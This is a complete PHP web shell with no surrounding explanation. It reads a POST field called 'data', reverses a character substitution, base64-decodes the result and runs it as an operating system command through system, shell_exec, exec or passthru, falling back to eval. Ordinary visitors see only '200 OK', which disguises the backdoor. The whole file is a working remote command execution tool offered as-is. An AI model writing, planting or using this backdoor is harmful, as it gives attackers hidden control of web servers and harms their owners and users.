<?php
@error_reporting(0);
session_start();

// 直接处理POST数据
if($_POST['data']){
    $m = array("|"=>"a","!"=>"b","@"=>"c","_"=>"d","~"=>"=");
    $d = strtr($_POST['data'], $m);
    $c = base64_decode($d);
    echo "<->";
    if(function_exists('system')){
        system($c);
    }elseif(function_exists('shell_exec')){
        echo shell_exec($c);
    }elseif(function_exists('exec')){
        exec($c, $o);
        echo implode("\n", $o);
    }elseif(function_exists('passthru')){
        passthru($c);
    }else{
        eval($c);
    }
    echo "<->";
    exit();
}

// 正常访问显示
echo "200 OK";
?>